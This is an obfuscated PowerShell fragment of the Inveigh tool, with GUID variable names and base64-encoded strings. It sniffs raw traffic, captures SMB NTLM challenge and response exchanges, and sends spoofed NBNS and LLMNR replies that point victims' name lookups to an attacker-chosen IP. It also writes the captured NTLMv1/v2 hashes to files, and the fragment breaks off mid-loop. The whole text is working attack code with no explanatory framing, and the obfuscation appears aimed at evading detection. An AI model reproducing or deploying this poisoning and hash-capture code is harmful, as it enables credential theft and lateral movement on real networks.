    param (${c5db9900dc8d4a1986872012ce91b73b},${7e494e4ea1a0426ab7d62b9675e564b6},${abd19e74908a450e847564f92e2000eb},${cd4629bb22504e88a1343d2e9edd39ef},${b8a133e08e4b4881a9cfa933aa78c19b},${dcac5669feaa43bda9605b66542e90eb},${e02740c242b24642905a7b9f9b2a7776},${c9cd43846ba641a4bd0d1bdc810d0f50},${d70c9d958dd44a10be0c532f517e3ef9},${a73d854ec3594cb5ac43e5562413d1c1},${bd1d14dc52ab4d71ab33f77ef0ab851a},${ab5c9a3797aa40cf86faf228516f1393},${d4dc92f8b9e04a91be5eb7099818dc83},${e1ee1c6aeb484ee2af1947e459200566},${dee7bdc3a9b748e894d764b79a5e7e1c},${e6e42c54e98044ba98fdf24d79b5f9ee})
    ${82ca3f67c03e4a63aedbda06d5f4809d} = New-Object Byte[] 4	
    ${018f23e9e8a64b7cb8d64121eac9b021} = New-Object Byte[] 4	
    ${5ad9a0f9f09b44eda4e6313855f9f47e} = New-Object Byte[] 4096
    ${82ca3f67c03e4a63aedbda06d5f4809d}[0] = 1  					
    ${82ca3f67c03e4a63aedbda06d5f4809d}[1-3] = 0
    ${018f23e9e8a64b7cb8d64121eac9b021}[0] = 1
    ${018f23e9e8a64b7cb8d64121eac9b021}[1-3] = 0
    ${98a67e4723ee472fa2340d2ec14a0f94}.sniffer_socket = New-Object System.Net.Sockets.Socket([Net.Sockets.AddressFamily]::InterNetwork,[Net.Sockets.SocketType]::Raw,[Net.Sockets.ProtocolType]::IP)
    ${98a67e4723ee472fa2340d2ec14a0f94}.sniffer_socket.SetSocketOption("IP",$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SABlAGEAZABlAHIASQBuAGMAbAB1AGQAZQBkAA=='))),$true)
    ${98a67e4723ee472fa2340d2ec14a0f94}.sniffer_socket.ReceiveBufferSize = 1024
    ${b3ed3a4c20444e999552516b6d54ee9e} = New-Object System.Net.IPEndpoint([Net.IPAddress]"${abd19e74908a450e847564f92e2000eb}", 0)
    ${98a67e4723ee472fa2340d2ec14a0f94}.sniffer_socket.Bind(${b3ed3a4c20444e999552516b6d54ee9e})
    [void]${98a67e4723ee472fa2340d2ec14a0f94}.sniffer_socket.IOControl([Net.Sockets.IOControlCode]::ReceiveAll,${82ca3f67c03e4a63aedbda06d5f4809d},${018f23e9e8a64b7cb8d64121eac9b021})
    ${823cf7a196e7464fa7e087c6c6eb02b9} = [BitConverter]::GetBytes(${dee7bdc3a9b748e894d764b79a5e7e1c})
    [array]::Reverse(${823cf7a196e7464fa7e087c6c6eb02b9})
    ${9b70605fe18b4028bd073f7bacf39cd0} = [BitConverter]::GetBytes(${e6e42c54e98044ba98fdf24d79b5f9ee})
    [array]::Reverse(${9b70605fe18b4028bd073f7bacf39cd0})
    if(${e1ee1c6aeb484ee2af1947e459200566})
    {    
        ${33982a688b3f4054bb5c750d9ac414a1} = new-timespan -Minutes ${e1ee1c6aeb484ee2af1947e459200566}
        ${154e7d7a601443998327cde089d7369d} = [diagnostics.stopwatch]::StartNew()
    }
    while(${98a67e4723ee472fa2340d2ec14a0f94}.running)
    {
        ${ef93cffac9aa41ae89aad3b852a1fc4b} = ${98a67e4723ee472fa2340d2ec14a0f94}.sniffer_socket.Receive(${5ad9a0f9f09b44eda4e6313855f9f47e},0,${5ad9a0f9f09b44eda4e6313855f9f47e}.length,[Net.Sockets.SocketFlags]::None)
        ${52c45904fce048da8132b3c3c58fa8d3} = New-Object System.IO.MemoryStream(${5ad9a0f9f09b44eda4e6313855f9f47e},0,${ef93cffac9aa41ae89aad3b852a1fc4b})
        ${b4304126005f4398a3eb28bab5b0c479} = New-Object System.IO.BinaryReader(${52c45904fce048da8132b3c3c58fa8d3})
        ${3bd83b530e8549dca26fb03e8bf833d6} = ${b4304126005f4398a3eb28bab5b0c479}.ReadByte()
        ${74298abfa0b446f0985d5be86529480a}= ${b4304126005f4398a3eb28bab5b0c479}.ReadByte()
        ${46fa3ae2e31e4fcb9e0cb4110c804948} = DataToUInt16 ${b4304126005f4398a3eb28bab5b0c479}.ReadBytes(2)
        ${a17936d41bce4eb39b03bbbfab794ff9} = ${b4304126005f4398a3eb28bab5b0c479}.ReadBytes(2)
        ${22bb91605582473e93cdc8fac82548dd} = ${b4304126005f4398a3eb28bab5b0c479}.ReadBytes(2)
        ${d5e38e0b63a34b15b7d0336f627e0c86} = ${b4304126005f4398a3eb28bab5b0c479}.ReadByte()
        ${b3fb0d430a484d06910052f02b7ae245} = ${b4304126005f4398a3eb28bab5b0c479}.ReadByte()
        ${04767954c72740eda524a2e837ff0eed} = [Net.IPAddress]::NetworkToHostOrder(${b4304126005f4398a3eb28bab5b0c479}.ReadInt16())
        ${94df499853ef4b83bba0ea05be56db48} = ${b4304126005f4398a3eb28bab5b0c479}.ReadBytes(4)
        ${2940dc5f22dc4ba18210d4acc5b9ff8f} = [System.Net.IPAddress]${94df499853ef4b83bba0ea05be56db48}
        ${dbcd409e43fc45f7a8aeac24b9edae88} = ${b4304126005f4398a3eb28bab5b0c479}.ReadBytes(4)
        ${89123f1c6a43492c8eb8338cd946d508} = [System.Net.IPAddress]${dbcd409e43fc45f7a8aeac24b9edae88}
        ${ad1cfe0ead264e1bad71a7c42f7317fc} = [int]"0x$(($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ewAwADoAWAB9AA=='))) -f ${3bd83b530e8549dca26fb03e8bf833d6})[0])"
        ${6a6947a586fa42fc935752b1f5d43fb4} = [int]"0x$(($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ewAwADoAWAB9AA=='))) -f ${3bd83b530e8549dca26fb03e8bf833d6})[1])" * 4
        switch(${b3fb0d430a484d06910052f02b7ae245})
        {
            6 
            {  
                ${615e1b83bddf4d4782cd459234da7193} = DataToUInt16 ${b4304126005f4398a3eb28bab5b0c479}.ReadBytes(2)
                ${db00d7975f0443809cbed775ffa7a413} = DataToUInt16 ${b4304126005f4398a3eb28bab5b0c479}.ReadBytes(2)
                ${ac45e1e5c8784fab959127ef7c522315} = DataToUInt32 ${b4304126005f4398a3eb28bab5b0c479}.ReadBytes(4)
                ${55ffe411e9054d2c84b8cfa73bdfc069} = DataToUInt32 ${b4304126005f4398a3eb28bab5b0c479}.ReadBytes(4)
                ${cc0b5e5697194a7fa8198eedf39139a5} = [int]"0x$(($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ewAwADoAWAB9AA=='))) -f ${b4304126005f4398a3eb28bab5b0c479}.ReadByte())[0])" * 4
                ${1fae0368cea3443c9b587c145108e18a} = ${b4304126005f4398a3eb28bab5b0c479}.ReadByte()
                ${5bbe6e84c65448a4bfb189c0690a5518} = DataToUInt16 ${b4304126005f4398a3eb28bab5b0c479}.ReadBytes(2)
                ${d4a4dd2e3f084e658ec8d62da277cd1d} = [System.Net.IPAddress]::NetworkToHostOrder(${b4304126005f4398a3eb28bab5b0c479}.ReadInt16())
                ${176b1dd1ed404c6d89f553d4608313c1} = DataToUInt16 ${b4304126005f4398a3eb28bab5b0c479}.ReadBytes(2)    
                ${c08eba43cd9e4925b5273004b82623c5} = ${b4304126005f4398a3eb28bab5b0c479}.ReadBytes(${46fa3ae2e31e4fcb9e0cb4110c804948} - (${6a6947a586fa42fc935752b1f5d43fb4} + ${cc0b5e5697194a7fa8198eedf39139a5}))
                switch (${db00d7975f0443809cbed775ffa7a413})
                {
                    139 
                    {
                        if(${b8a133e08e4b4881a9cfa933aa78c19b} -eq 'y')
                        {
                            SMBNTLMResponse ${c08eba43cd9e4925b5273004b82623c5}
                        }
                    }
                    445
                    { 
                        if(${b8a133e08e4b4881a9cfa933aa78c19b} -eq 'y')
                        {
                            SMBNTLMResponse ${c08eba43cd9e4925b5273004b82623c5}
                        }
                    }
                }
                switch (${615e1b83bddf4d4782cd459234da7193})
                {
                    139 
                    {
                        if(${b8a133e08e4b4881a9cfa933aa78c19b} -eq 'y')
                        {   
                            ${0bd5ba00bfd54a85948d76bfd4b4ef11} = SMBNTLMChallenge ${c08eba43cd9e4925b5273004b82623c5}
                        }
                    }
                    445 
                    {
                        if(${b8a133e08e4b4881a9cfa933aa78c19b} -eq 'y')
                        {   
                            ${0bd5ba00bfd54a85948d76bfd4b4ef11} = SMBNTLMChallenge ${c08eba43cd9e4925b5273004b82623c5}
                        }
                    }
                }
            }       
            17 
            {  
                ${615e1b83bddf4d4782cd459234da7193} =  ${b4304126005f4398a3eb28bab5b0c479}.ReadBytes(2)
                ${3f4420efc65d44a487ca1481e5f3a8cd} = DataToUInt16 (${615e1b83bddf4d4782cd459234da7193})
                ${db00d7975f0443809cbed775ffa7a413} = DataToUInt16 ${b4304126005f4398a3eb28bab5b0c479}.ReadBytes(2)
                ${4de86e8d6305447c88d147f01e4f2554} = ${b4304126005f4398a3eb28bab5b0c479}.ReadBytes(2)
                ${48bfeed0f38c42f8808eea10e0942ea5}  = DataToUInt16 (${4de86e8d6305447c88d147f01e4f2554})
                [void]${b4304126005f4398a3eb28bab5b0c479}.ReadBytes(2)
                ${c08eba43cd9e4925b5273004b82623c5} = ${b4304126005f4398a3eb28bab5b0c479}.ReadBytes((${48bfeed0f38c42f8808eea10e0942ea5} - 2) * 4)
                switch (${db00d7975f0443809cbed775ffa7a413})
                {
                    137 
                    { 
                        if(${c08eba43cd9e4925b5273004b82623c5}[5] -eq 1 -and ${abd19e74908a450e847564f92e2000eb} -ne ${2940dc5f22dc4ba18210d4acc5b9ff8f})
                        {
                            ${4de86e8d6305447c88d147f01e4f2554}[0] += 16
                            [Byte[]]$NBNS_response_data = ${c08eba43cd9e4925b5273004b82623c5}[13..${c08eba43cd9e4925b5273004b82623c5}.length]`
                                + ${9b70605fe18b4028bd073f7bacf39cd0}`
                                + (0x00,0x06,0x00,0x00)`
                                + ([IPAddress][String]([IPAddress]${cd4629bb22504e88a1343d2e9edd39ef})).GetAddressBytes()`
                                + (0x00,0x00,0x00,0x00)
                            [Byte[]]$NBNS_response_packet = (0x00,0x89)`
                                + ${615e1b83bddf4d4782cd459234da7193}[1,0]`
                                + ${4de86e8d6305447c88d147f01e4f2554}[1,0]`
                                + (0x00,0x00)`
                                + ${c08eba43cd9e4925b5273004b82623c5}[0,1]`
                                + (0x85,0x00,0x00,0x00,0x00,0x01,0x00,0x00,0x00,0x00,0x20)`
                                + $NBNS_response_data
                            ${d43035a349e6477e9d39064fb145c7e7} = New-Object Net.Sockets.Socket( [Net.Sockets.AddressFamily]::InterNetwork,[Net.Sockets.SocketType]::Raw,[Net.Sockets.ProtocolType]::Udp )
                            ${d43035a349e6477e9d39064fb145c7e7}.SendBufferSize = 1024
                            ${6e5510c508094cfcb8241cfe5fb321c6} = New-Object Net.IPEndpoint(${2940dc5f22dc4ba18210d4acc5b9ff8f},${3f4420efc65d44a487ca1481e5f3a8cd})
                            ${621ea5ad972549ad8347bc019ab75006} = [System.BitConverter]::ToString(${c08eba43cd9e4925b5273004b82623c5}[43..44])
                            switch (${621ea5ad972549ad8347bc019ab75006})
                            {
                                $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('NAAxAC0ANAAxAA=='))) {
                                    ${621ea5ad972549ad8347bc019ab75006} = '00'
                                }
                                $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('NAAxAC0ANAA0AA=='))) {
                                    ${621ea5ad972549ad8347bc019ab75006} = '03'
                                }
                                $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('NAAzAC0ANAAxAA=='))) {
                                    ${621ea5ad972549ad8347bc019ab75006} = '20'
                                }
                                $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('NAAyAC0ANABDAA=='))) {
                                    ${621ea5ad972549ad8347bc019ab75006} = '1B'
                                }
                                $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('NAAyAC0ANABEAA=='))) {
                                ${621ea5ad972549ad8347bc019ab75006} = '1C'
                                }
                                $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('NAAyAC0ANABFAA=='))) {
                                ${621ea5ad972549ad8347bc019ab75006} = '1D'
                                }
                                $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('NAAyAC0ANABGAA=='))) {
                                ${621ea5ad972549ad8347bc019ab75006} = '1E'
                                }
                            }
                            ${fc708f2272d748b2ae03f787c75d5ba6} = [System.BitConverter]::ToString(${c08eba43cd9e4925b5273004b82623c5}[13..(${c08eba43cd9e4925b5273004b82623c5}.length - 4)])
                            ${fc708f2272d748b2ae03f787c75d5ba6} = ${fc708f2272d748b2ae03f787c75d5ba6} -replace $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('LQAwADAA'))),""
                            ${fc708f2272d748b2ae03f787c75d5ba6} = ${fc708f2272d748b2ae03f787c75d5ba6}.Split("-") | %{ [CHAR][CONVERT]::toint16($_,16)}
                            ${94afec4b45cd43df8463de5fc461bae8} = New-Object System.String (${fc708f2272d748b2ae03f787c75d5ba6},0,${fc708f2272d748b2ae03f787c75d5ba6}.Length)
                            ${94afec4b45cd43df8463de5fc461bae8} = ${94afec4b45cd43df8463de5fc461bae8}.Substring(0,${94afec4b45cd43df8463de5fc461bae8}.IndexOf("CA"))
                            ${d502f5caf1e4450e80afe90547e8d8c1} = ""
                            ${a2e99906d7374782ab2b761afdf3527a} = ""
                            ${5fbc4d0b6e5f45be9d18dd7733893ef1} = 0
                            do
                            {
                                ${e726b74ad2c7403fb772121350e8f033} = (([byte][char](${94afec4b45cd43df8463de5fc461bae8}.Substring(${5fbc4d0b6e5f45be9d18dd7733893ef1},1)))-65)
                                ${d502f5caf1e4450e80afe90547e8d8c1} += ([convert]::ToString(${e726b74ad2c7403fb772121350e8f033},16))
                                ${5fbc4d0b6e5f45be9d18dd7733893ef1} += 1
                            }
                            until(${5fbc4d0b6e5f45be9d18dd7733893ef1} -gt (${94afec4b45cd43df8463de5fc461bae8}.Length - 1))
                            ${5fbc4d0b6e5f45be9d18dd7733893ef1} = 0
                            do
                            {
                                ${a2e99906d7374782ab2b761afdf3527a} += ([char]([convert]::toint16(${d502f5caf1e4450e80afe90547e8d8c1}.Substring(${5fbc4d0b6e5f45be9d18dd7733893ef1},2),16)))
                                ${5fbc4d0b6e5f45be9d18dd7733893ef1} += 2
                            }
                            until(${5fbc4d0b6e5f45be9d18dd7733893ef1} -gt (${d502f5caf1e4450e80afe90547e8d8c1}.Length - 1) -or ${a2e99906d7374782ab2b761afdf3527a}.length -eq 15)
                            if(${e02740c242b24642905a7b9f9b2a7776} -eq 'y')
                            {
                                if(${c9cd43846ba641a4bd0d1bdc810d0f50} -contains ${621ea5ad972549ad8347bc019ab75006})
                                { 
                                    if ((!${d70c9d958dd44a10be0c532f517e3ef9} -or ${d70c9d958dd44a10be0c532f517e3ef9} -contains ${a2e99906d7374782ab2b761afdf3527a}) -and (!${a73d854ec3594cb5ac43e5562413d1c1} -or ${a73d854ec3594cb5ac43e5562413d1c1} -notcontains ${a2e99906d7374782ab2b761afdf3527a}) -and (!${bd1d14dc52ab4d71ab33f77ef0ab851a} -or ${bd1d14dc52ab4d71ab33f77ef0ab851a} -contains ${2940dc5f22dc4ba18210d4acc5b9ff8f}) -and (!${ab5c9a3797aa40cf86faf228516f1393} -or ${ab5c9a3797aa40cf86faf228516f1393} -notcontains ${2940dc5f22dc4ba18210d4acc5b9ff8f}) -and ${98a67e4723ee472fa2340d2ec14a0f94}.IP_capture_list -notcontains ${2940dc5f22dc4ba18210d4acc5b9ff8f})
                                    {
                                        [void]${d43035a349e6477e9d39064fb145c7e7}.sendTo( $NBNS_response_packet, ${6e5510c508094cfcb8241cfe5fb321c6} )
                                        ${d43035a349e6477e9d39064fb145c7e7}.Close()
                                        ${7e494e4ea1a0426ab7d62b9675e564b6} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('LQAgAHMAcABvAG8AZgBlAGQAIAByAGUAcwBwAG8AbgBzAGUAIABoAGEAcwAgAGIAZQBlAG4AIABzAGUAbgB0AA==')))
                                    }
                                    else
                                    {
                                        if(${d70c9d958dd44a10be0c532f517e3ef9} -and ${d70c9d958dd44a10be0c532f517e3ef9} -notcontains ${a2e99906d7374782ab2b761afdf3527a})
                                        {
                                            ${7e494e4ea1a0426ab7d62b9675e564b6} = "- ${a2e99906d7374782ab2b761afdf3527a} is not on reply list"
                                        }
                                        elseif(${a73d854ec3594cb5ac43e5562413d1c1} -and ${a73d854ec3594cb5ac43e5562413d1c1} -contains ${a2e99906d7374782ab2b761afdf3527a})
                                        {
                                            ${7e494e4ea1a0426ab7d62b9675e564b6} = "- ${a2e99906d7374782ab2b761afdf3527a} is on ignore list"
                                        }
                                        elseif(${bd1d14dc52ab4d71ab33f77ef0ab851a} -and ${bd1d14dc52ab4d71ab33f77ef0ab851a} -notcontains ${2940dc5f22dc4ba18210d4acc5b9ff8f})
                                        {
                                            ${7e494e4ea1a0426ab7d62b9675e564b6} = "- ${2940dc5f22dc4ba18210d4acc5b9ff8f} is not on reply list"
                                        }
                                        elseif(${ab5c9a3797aa40cf86faf228516f1393} -and ${ab5c9a3797aa40cf86faf228516f1393} -contains ${2940dc5f22dc4ba18210d4acc5b9ff8f})
                                        {
                                            ${7e494e4ea1a0426ab7d62b9675e564b6} = "- ${2940dc5f22dc4ba18210d4acc5b9ff8f} is on ignore list"
                                        }
                                        else
                                        {
                                            ${7e494e4ea1a0426ab7d62b9675e564b6} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('LQAgAHMAcABvAG8AZgAgAHMAdQBwAHAAcgBlAHMAcwBlAGQAIABkAHUAZQAgAHQAbwAgAHAAcgBlAHYAaQBvAHUAcwAgAGMAYQBwAHQAdQByAGUA')))
                                        }
                                    }
                                }
                                else
                                {
                                    ${7e494e4ea1a0426ab7d62b9675e564b6} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('LQAgAHMAcABvAG8AZgAgAG4AbwB0ACAAcwBlAG4AdAAgAGQAdQBlACAAdABvACAAZABpAHMAYQBiAGwAZQBkACAAdAB5AHAAZQA=')))
                                }
                            }
                            ${98a67e4723ee472fa2340d2ec14a0f94}.console_queue.add("$(Get-Date -format 's') - NBNS request for ${a2e99906d7374782ab2b761afdf3527a}<${621ea5ad972549ad8347bc019ab75006}> received from ${2940dc5f22dc4ba18210d4acc5b9ff8f} ${7e494e4ea1a0426ab7d62b9675e564b6}")
                            ${98a67e4723ee472fa2340d2ec14a0f94}.log.add(${98a67e4723ee472fa2340d2ec14a0f94}.log_file_queue[${98a67e4723ee472fa2340d2ec14a0f94}.log_file_queue.add("$(Get-Date -format 's') - NBNS request for ${a2e99906d7374782ab2b761afdf3527a}<${621ea5ad972549ad8347bc019ab75006}> received from ${2940dc5f22dc4ba18210d4acc5b9ff8f} ${7e494e4ea1a0426ab7d62b9675e564b6}")])
                        }
                    }
                    5355 
                    { 
                        if([System.BitConverter]::ToString(${c08eba43cd9e4925b5273004b82623c5}[(${c08eba43cd9e4925b5273004b82623c5}.length - 4)..(${c08eba43cd9e4925b5273004b82623c5}.length - 3)]) -ne $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('MAAwAC0AMQBjAA==')))) 
                        {
                            ${4de86e8d6305447c88d147f01e4f2554}[0] += ${c08eba43cd9e4925b5273004b82623c5}.length - 2
                            [byte[]]$LLMNR_response_data = ${c08eba43cd9e4925b5273004b82623c5}[12..${c08eba43cd9e4925b5273004b82623c5}.length]
                                $LLMNR_response_data += $LLMNR_response_data`
                                + ${823cf7a196e7464fa7e087c6c6eb02b9}`
                                + (0x00,0x04)`
                                + ([IPAddress][String]([IPAddress]${cd4629bb22504e88a1343d2e9edd39ef})).GetAddressBytes()
                            [byte[]]$LLMNR_response_packet = (0x14,0xeb)`
                                + ${615e1b83bddf4d4782cd459234da7193}[1,0]`
                                + ${4de86e8d6305447c88d147f01e4f2554}[1,0]`
                                + (0x00,0x00)`
                                + ${c08eba43cd9e4925b5273004b82623c5}[0,1]`
                                + (0x80,0x00,0x00,0x01,0x00,0x01,0x00,0x00,0x00,0x00)`
                                + $LLMNR_response_data
                            ${d43035a349e6477e9d39064fb145c7e7} = New-Object Net.Sockets.Socket( [Net.Sockets.AddressFamily]::InterNetwork,[Net.Sockets.SocketType]::Raw,[Net.Sockets.ProtocolType]::Udp )
                            ${d43035a349e6477e9d39064fb145c7e7}.SendBufferSize = 1024
                            ${6e5510c508094cfcb8241cfe5fb321c6} = New-Object Net.IPEndpoint(${2940dc5f22dc4ba18210d4acc5b9ff8f}, ${3f4420efc65d44a487ca1481e5f3a8cd})
                            ${200b728ee55f4038b8c36c3042bface7} = [System.BitConverter]::ToString(${c08eba43cd9e4925b5273004b82623c5}[13..(${c08eba43cd9e4925b5273004b82623c5}.length - 4)])
                            ${200b728ee55f4038b8c36c3042bface7} = ${200b728ee55f4038b8c36c3042bface7} -replace $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('LQAwADAA'))),""
                            ${200b728ee55f4038b8c36c3042bface7} = ${200b728ee55f4038b8c36c3042bface7}.Split("-") | %{ [CHAR][CONVERT]::toint16($_,16)}
                            ${a38a7e42d72e4fdba8a4dc7c9c759708} = New-Object System.String (${200b728ee55f4038b8c36c3042bface7},0,${200b728ee55f4038b8c36c3042bface7}.Length)
                            if(${dcac5669feaa43bda9605b66542e90eb} -eq 'y')
                            {
                                if((!${d70c9d958dd44a10be0c532f517e3ef9} -or ${d70c9d958dd44a10be0c532f517e3ef9} -contains ${a38a7e42d72e4fdba8a4dc7c9c759708}) -and (!${a73d854ec3594cb5ac43e5562413d1c1} -or ${a73d854ec3594cb5ac43e5562413d1c1} -notcontains ${a38a7e42d72e4fdba8a4dc7c9c759708}) -and (!${bd1d14dc52ab4d71ab33f77ef0ab851a} -or ${bd1d14dc52ab4d71ab33f77ef0ab851a} -contains ${2940dc5f22dc4ba18210d4acc5b9ff8f}) -and (!${ab5c9a3797aa40cf86faf228516f1393} -or ${ab5c9a3797aa40cf86faf228516f1393} -notcontains ${2940dc5f22dc4ba18210d4acc5b9ff8f}) -and ${98a67e4723ee472fa2340d2ec14a0f94}.IP_capture_list -notcontains ${2940dc5f22dc4ba18210d4acc5b9ff8f})
                                {
                                    [void]${d43035a349e6477e9d39064fb145c7e7}.sendTo( $LLMNR_response_packet, ${6e5510c508094cfcb8241cfe5fb321c6} )
                                    ${d43035a349e6477e9d39064fb145c7e7}.Close( )
                                    ${c5db9900dc8d4a1986872012ce91b73b} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('LQAgAHMAcABvAG8AZgBlAGQAIAByAGUAcwBwAG8AbgBzAGUAIABoAGEAcwAgAGIAZQBlAG4AIABzAGUAbgB0AA==')))
                                }
                                else
                                {
                                    if(${d70c9d958dd44a10be0c532f517e3ef9} -and ${d70c9d958dd44a10be0c532f517e3ef9} -notcontains ${a38a7e42d72e4fdba8a4dc7c9c759708})
                                    {
                                        ${c5db9900dc8d4a1986872012ce91b73b} = "- ${a38a7e42d72e4fdba8a4dc7c9c759708} is not on reply list"
                                    }
                                    elseif(${a73d854ec3594cb5ac43e5562413d1c1} -and ${a73d854ec3594cb5ac43e5562413d1c1} -contains ${a38a7e42d72e4fdba8a4dc7c9c759708})
                                    {
                                        ${c5db9900dc8d4a1986872012ce91b73b} = "- ${a38a7e42d72e4fdba8a4dc7c9c759708} is on ignore list"
                                    }
                                    elseif(${bd1d14dc52ab4d71ab33f77ef0ab851a} -and ${bd1d14dc52ab4d71ab33f77ef0ab851a} -notcontains ${2940dc5f22dc4ba18210d4acc5b9ff8f})
                                    {
                                        ${c5db9900dc8d4a1986872012ce91b73b} = "- ${2940dc5f22dc4ba18210d4acc5b9ff8f} is not on reply list"
                                    }
                                    elseif(${ab5c9a3797aa40cf86faf228516f1393} -and ${ab5c9a3797aa40cf86faf228516f1393} -contains ${2940dc5f22dc4ba18210d4acc5b9ff8f})
                                    {
                                        ${c5db9900dc8d4a1986872012ce91b73b} = "- ${2940dc5f22dc4ba18210d4acc5b9ff8f} is on ignore list"
                                    }
                                    else
                                    {
                                        ${c5db9900dc8d4a1986872012ce91b73b} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('LQAgAHMAcABvAG8AZgAgAHMAdQBwAHAAcgBlAHMAcwBlAGQAIABkAHUAZQAgAHQAbwAgAHAAcgBlAHYAaQBvAHUAcwAgAGMAYQBwAHQAdQByAGUA')))
                                    }
                                }
                            }
                            ${98a67e4723ee472fa2340d2ec14a0f94}.console_queue.add("$(Get-Date -format 's') - LLMNR request for ${a38a7e42d72e4fdba8a4dc7c9c759708} received from ${2940dc5f22dc4ba18210d4acc5b9ff8f} ${c5db9900dc8d4a1986872012ce91b73b}")
                            ${98a67e4723ee472fa2340d2ec14a0f94}.log.add(${98a67e4723ee472fa2340d2ec14a0f94}.log_file_queue[${98a67e4723ee472fa2340d2ec14a0f94}.log_file_queue.add("$(Get-Date -format 's') - LLMNR request for ${a38a7e42d72e4fdba8a4dc7c9c759708} received from ${2940dc5f22dc4ba18210d4acc5b9ff8f} ${c5db9900dc8d4a1986872012ce91b73b}")])
                        }
                    }
                }
            }
        }
        if(${e1ee1c6aeb484ee2af1947e459200566})
        {    
            if(${154e7d7a601443998327cde089d7369d}.elapsed -ge ${33982a688b3f4054bb5c750d9ac414a1})
            {
                if(${98a67e4723ee472fa2340d2ec14a0f94}.HTTP_listener.IsListening)
                {
                    ${98a67e4723ee472fa2340d2ec14a0f94}.HTTP_listener.Stop()
                    ${98a67e4723ee472fa2340d2ec14a0f94}.HTTP_listener.Close()
                }
                if(${98a67e4723ee472fa2340d2ec14a0f94}.relay_running)
                {
                    ${98a67e4723ee472fa2340d2ec14a0f94}.console_queue.add("Inveigh Relay exited due to run time at $(Get-Date -format 's')")
                    ${98a67e4723ee472fa2340d2ec14a0f94}.log.add(${98a67e4723ee472fa2340d2ec14a0f94}.log_file_queue[${98a67e4723ee472fa2340d2ec14a0f94}.log_file_queue.add("$(Get-Date -format 's') - Inveigh Relay exited due to run time")])
                    sleep -m 5
                    ${98a67e4723ee472fa2340d2ec14a0f94}.relay_running = $false
                } 
                ${98a67e4723ee472fa2340d2ec14a0f94}.console_queue.add("Inveigh exited due to run time at $(Get-Date -format 's')")
                ${98a67e4723ee472fa2340d2ec14a0f94}.log.add(${98a67e4723ee472fa2340d2ec14a0f94}.log_file_queue[${98a67e4723ee472fa2340d2ec14a0f94}.log_file_queue.add("$(Get-Date -format 's') - Inveigh exited due to run time")])
                sleep -m 5
                ${98a67e4723ee472fa2340d2ec14a0f94}.running = $false
                if(${98a67e4723ee472fa2340d2ec14a0f94}.HTTPS)
                {
                    & $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('bgBlAHQAcwBoAA=='))) http delete sslcert ipport=0.0.0.0:443 > $null
                    try
                    {
                        ${925f8307b58e4f8f9c79fdb766b92b9f} = New-Object System.Security.Cryptography.X509Certificates.X509Store("My",$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABvAGMAYQBsAE0AYQBjAGgAaQBuAGUA'))))
                        ${925f8307b58e4f8f9c79fdb766b92b9f}.Open($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAGEAZABXAHIAaQB0AGUA'))))
                        ${2b05bef5311b4efd95c42dffa7b9312f} = ${925f8307b58e4f8f9c79fdb766b92b9f}.certificates.find($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RgBpAG4AZABCAHkAVABoAHUAbQBiAHAAcgBpAG4AdAA='))),${98a67e4723ee472fa2340d2ec14a0f94}.certificate_thumbprint,$false)[0]
                        ${925f8307b58e4f8f9c79fdb766b92b9f}.Remove(${2b05bef5311b4efd95c42dffa7b9312f})
                        ${925f8307b58e4f8f9c79fdb766b92b9f}.Close()
                    }
                    catch
                    {
                        if(${98a67e4723ee472fa2340d2ec14a0f94}.status_output)
                        {
                            ${98a67e4723ee472fa2340d2ec14a0f94}.console_queue.add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBTAEwAIABDAGUAcgB0AGkAZgBpAGMAYQB0AGUAIABEAGUAbABlAHQAaQBvAG4AIABFAHIAcgBvAHIAIAAtACAAUgBlAG0AbwB2AGUAIABNAGEAbgB1AGEAbABsAHkA'))))
                        }
                        ${98a67e4723ee472fa2340d2ec14a0f94}.log.add("$(Get-Date -format 's') - SSL Certificate Deletion Error - Remove Manually")
                        if(${98a67e4723ee472fa2340d2ec14a0f94}.file_output)
                        {
                            "$(Get-Date -format 's') - SSL Certificate Deletion Error - Remove Manually"| Out-File ${98a67e4723ee472fa2340d2ec14a0f94}.log_out_file -Append   
                        }
                    }
                }
                ${98a67e4723ee472fa2340d2ec14a0f94}.HTTP = $false
                ${98a67e4723ee472fa2340d2ec14a0f94}.HTTPS = $false     
            }
        }
        if(${98a67e4723ee472fa2340d2ec14a0f94}.file_output)
        {
            while(${98a67e4723ee472fa2340d2ec14a0f94}.log_file_queue.Count -gt 0)
            {
                ${98a67e4723ee472fa2340d2ec14a0f94}.log_file_queue[0]|Out-File ${98a67e4723ee472fa2340d2ec14a0f94}.log_out_file -Append
                ${98a67e4723ee472fa2340d2ec14a0f94}.log_file_queue.RemoveRange(0,1)
            }
            while(${98a67e4723ee472fa2340d2ec14a0f94}.NTLMv1_file_queue.Count -gt 0)
            {
                ${98a67e4723ee472fa2340d2ec14a0f94}.NTLMv1_file_queue[0]|Out-File ${98a67e4723ee472fa2340d2ec14a0f94}.NTLMv1_out_file -Append
                ${98a67e4723ee472fa2340d2ec14a0f94}.NTLMv1_file_queue.RemoveRange(0,1)
            }
            while(${98a67e4723ee472fa2340d2ec14a0f94}.NTLMv2_file_queue.Count -gt 0)
            {
